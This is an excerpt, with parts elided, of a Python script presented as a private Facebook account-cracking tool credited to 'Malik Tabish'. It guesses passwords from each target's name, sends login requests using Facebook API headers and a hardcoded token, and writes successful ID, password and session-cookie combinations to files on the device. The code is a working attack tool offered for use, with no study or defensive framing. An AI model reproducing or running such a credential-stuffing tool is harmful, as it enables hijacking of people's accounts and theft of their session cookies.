...
logo =                                          """            
 ...
 \033[1;93m     .::    .::      .::     .::::     \033[1;93m 
                                        CREATED BY TABISH
 \033[1;37m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
 \033[1;96m CREATOR = MALIK TABISH
 \033[1;96m STATUS = PRIVATE
 \033[1;96m TRUST ON YOUR SELF ONLY
 \033[1;96m DUNIYA MATLABI / AB APNAY KAAM SE MATLAB SIRF
 \033[1;37m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
                                       """
def clear():
    os.system("clear")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("PRESS ENTER TO BACK TXO Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[TABISH] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [TXO-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TXO_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [TXO-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/TXO_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            os.system("clear")
            print(logo)            
            print(f"\r{A}TABISH CRACKING HAS BEEN STARTED {S}")
            print(47*"-")
